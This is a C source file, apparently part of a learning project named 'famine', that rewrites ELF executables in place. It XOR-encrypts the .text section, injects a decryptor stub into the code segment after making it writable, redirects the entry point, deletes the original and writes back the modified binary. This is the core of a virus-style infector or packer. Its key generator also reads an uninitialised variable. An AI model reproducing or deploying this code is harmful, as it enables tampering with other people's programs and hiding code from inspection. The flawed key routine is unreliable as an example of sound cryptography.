#include "famine.h"

uint64_t generate_key()
{
	uint64_t key;

	for (int i = 0; i < 8; ++i)
	{
		clock_t tic = clock();
		key = (key * 10) + (tic % 9);
	}

	return key;
}

int change_load_segment(t_dset *dset, t_woody *woody)
{
	void *ptr;
	ssize_t len;

	ptr = woody->addr + woody->code->p_offset + woody->code->p_filesz;
	woody->code->p_memsz += g_decryptor_len;
	woody->code->p_filesz += g_decryptor_len;
	woody->code->p_flags = woody->code->p_flags | PF_W; // add the writable flag: PF_W (== 0b010); all flags: PF_R | PF_W | PF_X == 0b111 == 0x7
	len = g_decryptor_len - sizeof(t_dset);
	ft_memmove(ptr, g_decryptor, len);
	ft_memmove(ptr + len, dset, sizeof(t_dset));

	return (0);
}

void encrypt_text_section(t_woody *woody, void *data, uint64_t key)
{
	size_t size;
	uint64_t key_copy; // unsigned long long // 8 bite (64 bits)
	uint64_t value;

	size = woody->text->sh_size;
	key_copy = key;
	for (size_t i = 0; i < size; i++)
	{
		*(unsigned char *)(data + i) = *(unsigned char *)(data + i) ^ (key & 0b11111111); // get last 8 bits of the value // The least significant byte is the 8-bits at the right-hand side.
		value = key & 0b0000001;														  // 0 or 1
		value = value << 63;															  // 0 or -9223372036854775808
		key = (key / 2) | value;														  // key = (key >> 1) | value;
	}
}

int write_to_file(t_woody *woody, char *filename)
{
	int fd;
	ssize_t i;
	fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd > 0)
	{
		i = 0;
		while (i < woody->filesize)
		{
			write(fd, woody->addr + i, 1);
			++i;
		}
		close(fd);
	}
	else
	{
		return ERROR_CODE;
	}
	return (i == woody->filesize);
}

uint64_t set_new_entry(t_woody *woody)
{
	Elf64_Ehdr *ehdr;

	ehdr = (Elf64_Ehdr *)woody->addr;
	ehdr->e_entry = woody->code->p_vaddr + woody->code->p_memsz;
	return (ehdr->e_entry);
}

int encrypt_func(t_woody *woody, char* filename)
{

	t_dset dset;
	void *data;

	data = woody->addr + woody->text->sh_offset;

	dset.key = generate_key();

	dset.original_entry = woody->ehdr->e_entry;
	dset.encrypted_code = woody->text->sh_addr;
	dset.encrypted_size = woody->text->sh_size;
	dset.encrypted_entry = set_new_entry(woody);

	encrypt_text_section(woody, data, dset.key);
	change_load_segment(&dset, woody);
	remove(filename); 
	if (write_to_file(woody, filename) != 1)
	{
		free(filename);
		return ERROR_CODE;
	}
	free(filename);
	return 0;
}